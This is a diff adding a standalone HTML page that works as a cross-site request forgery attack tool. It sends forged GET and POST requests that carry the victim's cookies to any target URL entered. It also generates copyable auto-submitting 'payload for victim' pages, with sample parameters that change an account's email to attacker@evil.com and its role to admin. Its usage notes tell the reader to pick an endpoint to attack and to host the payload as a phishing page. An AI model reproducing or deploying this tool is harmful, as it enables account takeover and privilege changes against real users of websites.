@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CSRF PoC</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #0f0f1a;
+      color: #e0e0e0;
+      padding: 2rem;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .container { max-width: 800px; width: 100%; }
+    h1 {
+      font-size: 2rem;
+      background: linear-gradient(135deg, #6bcbff, #6bffb8);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-bottom: 1.5rem;
+    }
+    .back { color: #6bcbff; text-decoration: none; font-size: 0.9rem; display: inline-block; margin-bottom: 1rem; }
+    .card {
+      background: #1a1a2e;
+      border-radius: 10px;
+      padding: 1.5rem;
+      margin-bottom: 1.5rem;
+      border: 1px solid #2a2a4a;
+    }
+    .card h2 { font-size: 1.2rem; margin-bottom: 0.75rem; color: #6bcbff; }
+    .card p, .card label { color: #ccc; font-size: 0.9rem; line-height: 1.5; }
+    input[type="text"], input[type="url"] {
+      width: 100%;
+      padding: 0.6rem;
+      background: #0f0f1a;
+      border: 1px solid #3a3a5a;
+      border-radius: 6px;
+      color: #e0e0e0;
+      font-size: 0.9rem;
+      margin-top: 0.25rem;
+      font-family: 'Courier New', monospace;
+    }
+    input[type="text"] { margin-bottom: 0.5rem; }
+    button {
+      background: #6bcbff;
+      color: #000;
+      border: none;
+      padding: 0.5rem 1.2rem;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 0.9rem;
+      font-weight: 600;
+    }
+    button:hover { background: #5ab8ee; }
+    button.danger { background: #ff6b6b; color: #fff; }
+    button.danger:hover { background: #e05555; }
+    .output-box {
+      margin-top: 0.75rem;
+      padding: 0.75rem;
+      background: #0f0f1a;
+      border-radius: 6px;
+      border: 1px solid #2a2a4a;
+      min-height: 3rem;
+      font-family: 'Courier New', monospace;
+      font-size: 0.85rem;
+    }
+    .info {
+      background: #1a2a3a;
+      border: 1px solid #2a4a6a;
+      border-radius: 6px;
+      padding: 0.75rem;
+      margin-top: 0.75rem;
+      font-size: 0.85rem;
+      color: #8cf;
+    }
+    .info strong { color: #6bcbff; }
+    label { display: block; margin-top: 0.5rem; font-size: 0.85rem; color: #aaa; }
+    .field-group { margin-bottom: 0.75rem; }
+    .field-group label { margin-bottom: 0.25rem; }
+    hr { border: none; border-top: 1px solid #2a2a4a; margin: 1rem 0; }
+    .preview { font-size: 0.85rem; color: #ffd93d; word-break: break-all; }
+    textarea {
+      width: 100%;
+      min-height: 120px;
+      padding: 0.6rem;
+      background: #0f0f1a;
+      border: 1px solid #3a3a5a;
+      border-radius: 6px;
+      color: #e0e0e0;
+      font-size: 0.85rem;
+      font-family: 'Courier New', monospace;
+      margin-top: 0.25rem;
+    }
+    .method-badge {
+      display: inline-block;
+      padding: 0.15rem 0.5rem;
+      border-radius: 4px;
+      font-size: 0.7rem;
+      font-weight: 700;
+      margin-right: 0.4rem;
+    }
+    .method-get { background: #6bcbff; color: #000; }
+    .method-post { background: #ffd93d; color: #000; }
+    .tabs { display: flex; gap: 0.5rem; margin-bottom: 1rem; flex-wrap: wrap; }
+    .tab {
+      padding: 0.4rem 1rem;
+      border-radius: 6px;
+      background: #2a2a4a;
+      border: 1px solid #3a3a5a;
+      color: #aaa;
+      cursor: pointer;
+      font-size: 0.85rem;
+    }
+    .tab.active { background: #6bcbff; color: #000; border-color: #6bcbff; font-weight: 600; }
+    code { background: #2a2a3a; padding: 0.1rem 0.3rem; border-radius: 3px; font-size: 0.85rem; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <a href="index.html" class="back">&larr; Back</a>
+    <h1>CSRF Proof of Concept</h1>
+
+    <div class="tabs">
+      <button class="tab active" data-target="get-csrf">GET CSRF</button>
+      <button class="tab" data-target="post-csrf">POST CSRF</button>
+    </div>
+
+    <!-- Shared target URL config -->
+    <div class="card" style="border-color: #6bcbff;">
+      <h2 style="color: #ffd93d;">Target Configuration</h2>
+      <div class="field-group">
+        <label>Target URL</label>
+        <input type="url" id="target-url" value="http://target-site.com/action" placeholder="https://victim-site.com/api/action" />
+      </div>
+      <div class="field-group" id="post-params-group">
+        <label>POST Parameters (one per line, format: <code>key=value</code>)</label>
+        <textarea id="post-params" placeholder="email=attacker@evil.com&#10;role=admin">email=attacker@evil.com
+role=admin</textarea>
+      </div>
+    </div>
+
+    <!-- GET CSRF -->
+    <div id="get-csrf" class="card tab-content">
+      <h2><span class="method-badge method-get">GET</span> GET Request Forgery</h2>
+      <p>An <code>&lt;img&gt;</code> tag makes a cross-origin GET request when the page loads. The browser sends cookies automatically.</p>
+
+      <button class="danger" id="get-execute">Send GET Request</button>
+      <button id="get-show">Show Payload</button>
+
+      <div class="output-box" id="get-output">
+        <span style="color:#888">Ready. Configure the target URL and click "Send GET Request".</span>
+      </div>
+      <div class="preview" id="get-preview" style="display:none; margin-top: 0.5rem;"></div>
+
+      <hr>
+
+      <h2 style="color: #ffd93d; font-size: 1rem;">HTML Payload (for victim)</h2>
+      <textarea id="get-html-payload" readonly></textarea>
+      <button style="margin-top: 0.5rem; font-size: 0.8rem;" id="get-copy">Copy HTML</button>
+
+      <div class="info" style="margin-top: 0.75rem;">
+        <strong>How it works:</strong> The img tag below auto-fires when rendered. The browser attaches cookies for the target domain automatically.<br>
+        <strong>Note:</strong> CORS does not block <code>&lt;img&gt;</code> tags — the request <em>is</em> sent; only the response cannot be read.
+      </div>
+    </div>
+
+    <!-- POST CSRF -->
+    <div id="post-csrf" class="card tab-content" style="display:none">
+      <h2><span class="method-badge method-post">POST</span> POST Request Forgery</h2>
+      <p>An auto-submitting HTML form sends a POST request across origins. The browser includes cookies for the target domain.</p>
+
+      <button class="danger" id="post-execute">Send POST Request</button>
+      <button id="post-show">Show Payload</button>
+
+      <div class="output-box" id="post-output">
+        <span style="color:#888">Ready. Configure the target URL + parameters and click "Send POST Request".</span>
+      </div>
+      <div class="preview" id="post-preview" style="display:none; margin-top: 0.5rem;"></div>
+
+      <hr>
+
+      <h2 style="color: #ffd93d; font-size: 1rem;">HTML Payload (for victim)</h2>
+      <textarea id="post-html-payload" readonly></textarea>
+      <button style="margin-top: 0.5rem; font-size: 0.8rem;" id="post-copy">Copy HTML</button>
+
+      <div class="info" style="margin-top: 0.75rem;">
+        <strong>How it works:</strong> A hidden form with <code>action</code> set to the target URL is auto-submitted via JavaScript (<code>form.submit()</code>). The browser sends cookies automatically.<br>
+        <strong>Note:</strong> Form-based POST cross-origin works even without CORS headers.
+      </div>
+    </div>
+
+    <div class="card" style="border-color: #6bcbff;">
+      <h2 style="color: #ffd93d;">Usage</h2>
+      <p style="font-size:0.85rem; color:#aaa; line-height:1.6">
+        1. Set the <strong>Target URL</strong> to the endpoint you want to attack<br>
+        2. For POST CSRF, add parameters (one per line, <code>key=value</code>)<br>
+        3. Click <strong>Send GET/POST Request</strong> to execute the CSRF<br>
+        4. Use the generated HTML payload as a phishing page for the victim<br><br>
+        <strong>Tip:</strong> You can also save the generated HTML as a standalone file and host it anywhere.
+      </p>
+    </div>
+  </div>
+
+  <script>
+    // Tab switching
+    document.querySelectorAll('.tab').forEach(tab => {
+      tab.addEventListener('click', () => {
+        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+        document.querySelectorAll('.tab-content').forEach(c => c.style.display = 'none');
+        tab.classList.add('active');
+        document.getElementById(tab.dataset.target).style.display = 'block';
+      });
+    });
+
+    const targetUrl = document.getElementById('target-url');
+    const postParams = document.getElementById('post-params');
+
+    // ---------- GET CSRF ----------
+    function buildGetPayload(url) {
+      const imgHtml = `<img src="${url}" style="display:none" />`;
+      const iframeHtml = `<iframe src="${url}" style="display:none"></iframe>`;
+      return { imgHtml, iframeHtml };
+    }
+
+    function buildGetHTML(url) {
+      return `<!-- CSRF PoC: GET request -->\n<html>\n<body>\n<img src="${url}" style="display:none">\n<script>\nfetch("${url}", { credentials: "include" });\n<\/script>\n</body>\n</html>`;
+    }
+
+    document.getElementById('get-execute').addEventListener('click', () => {
+      const url = targetUrl.value.trim();
+      if (!url) return alert('Enter a target URL');
+
+      const output = document.getElementById('get-output');
+      const { imgHtml, iframeHtml } = buildGetPayload(url);
+
+      // Fire requests
+      output.innerHTML = `<span style="color:#8f8">&#10003; GET request sent to:</span> <span style="color:#ffd93d">${url}</span>`;
+
+      const img = document.createElement('img');
+      img.src = url;
+      img.style.display = 'none';
+      img.onerror = () => {}; // suppress console errors
+      document.body.appendChild(img);
+
+      // Also try fetch
+      try { fetch(url, { mode: 'no-cors', credentials: 'include' }); } catch(e) {}
+
+      document.getElementById('get-html-payload').value = buildGetHTML(url);
+    });
+
+    document.getElementById('get-show').addEventListener('click', () => {
+      const url = targetUrl.value.trim();
+      if (!url) return alert('Enter a target URL');
+      const { imgHtml } = buildGetPayload(url);
+      const preview = document.getElementById('get-preview');
+      preview.textContent = imgHtml;
+      preview.style.display = 'block';
+    });
+
+    document.getElementById('get-copy').addEventListener('click', () => {
+      const textarea = document.getElementById('get-html-payload');
+      textarea.select();
+      navigator.clipboard.writeText(textarea.value);
+      alert('HTML payload copied!');
+    });
+
+    // ---------- POST CSRF ----------
+    function parsePostParams(text) {
+      return text.split('\n')
+        .filter(line => line.includes('='))
+        .map(line => {
+          const eq = line.indexOf('=');
+          return [line.slice(0, eq).trim(), line.slice(eq + 1).trim()];
+        });
+    }
+
+    function buildPostHTML(url, params) {
+      let inputs = '';
+      params.forEach(([k, v]) => { inputs += `    <input type="hidden" name="${k}" value="${v}">\n`; });
+      return `<!-- CSRF PoC: POST request -->\n<html>\n<body>\n<form id="csrf" action="${url}" method="POST">\n${inputs}</form>\n<script>\ndocument.getElementById("csrf").submit();\n<\/script>\n</body>\n</html>`;
+    }
+
+    document.getElementById('post-execute').addEventListener('click', () => {
+      const url = targetUrl.value.trim();
+      if (!url) return alert('Enter a target URL');
+
+      const params = parsePostParams(postParams.value);
+      if (!params.length) return alert('Enter at least one parameter (key=value)');
+
+      const output = document.getElementById('post-output');
+      output.innerHTML = `<span style="color:#8f8">&#10003; POST request sent to:</span> <span style="color:#ffd93d">${url}</span>`;
+
+      // Build and submit hidden form
+      const form = document.createElement('form');
+      form.action = url;
+      form.method = 'POST';
+      form.style.display = 'none';
+      params.forEach(([k, v]) => {
+        const input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = k;
+        input.value = v;
+        form.appendChild(input);
+      });
+      document.body.appendChild(form);
+      form.submit();
+
+      document.getElementById('post-html-payload').value = buildPostHTML(url, params);
+    });
+
+    document.getElementById('post-show').addEventListener('click', () => {
+      const url = targetUrl.value.trim();
+      if (!url) return alert('Enter a target URL');
+
+      const params = parsePostParams(postParams.value);
+      if (!params.length) return alert('Enter at least one parameter (key=value)');
+
+      let previewText = `<form action="${url}" method="POST">\n`;
+      params.forEach(([k, v]) => { previewText += `  <input type="hidden" name="${k}" value="${v}">\n`; });
+      previewText += `</form>\n<script>document.forms[0].submit();</script>`;
+
+      const preview = document.getElementById('post-preview');
+      preview.textContent = previewText;
+      preview.style.display = 'block';
+    });
+
+    document.getElementById('post-copy').addEventListener('click', () => {
+      const textarea = document.getElementById('post-html-payload');
+      textarea.select();
+      navigator.clipboard.writeText(textarea.value);
+      alert('HTML payload copied!');
+    });
+
+    // ---------- Auto-generate on input change ----------
+    function autoGenerate() {
+      // GET
+      const getUrl = targetUrl.value.trim();
+      if (getUrl) {
+        document.getElementById('get-html-payload').value = buildGetHTML(getUrl);
+      }
+
+      // POST
+      const postUrl = targetUrl.value.trim();
+      if (postUrl) {
+        const params = parsePostParams(postParams.value);
+        if (params.length) {
+          document.getElementById('post-html-payload').value = buildPostHTML(postUrl, params);
+        }
+      }
+    }
+
+    targetUrl.addEventListener('input', autoGenerate);
+    postParams.addEventListener('input', autoGenerate);
+
+    // Initial generation
+    setTimeout(autoGenerate, 100);
+  </script>
+</body>
+</html>
